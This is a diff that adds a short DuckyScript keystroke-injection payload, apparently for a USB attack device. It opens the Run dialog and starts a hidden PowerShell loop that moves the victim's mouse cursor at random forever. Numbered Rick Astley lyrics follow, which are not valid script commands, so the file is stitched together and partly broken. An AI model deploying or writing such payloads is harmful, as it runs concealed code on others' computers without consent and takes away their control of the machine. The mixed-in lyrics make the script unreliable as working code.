@@ -1,0 +1,19 @@
+DELAY 500
+GUI r
+DELAY 750
+STRING powershell -w h -c "Add-Type -assemblyName System.Windows.Forms;$a=@(1..1000);while(1){[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(($a|get-random),($a|get-random));start-sleep -seconds 1}"
+ENTER
+01 Never gonna give you up
+02 Never gonna let you down
+03 Never gonna run around
+04 and desert you
+05 Never gonna make you cry
+06 Never gonna say goodbye
+07 Never gonna tell a lie
+08 and hurt you
+09 --------START SONG---------
+10 We're no strangers to love
+11 You know the rules
+12 And so do I
+13 A full commitment's what
+14 I'm thinkin
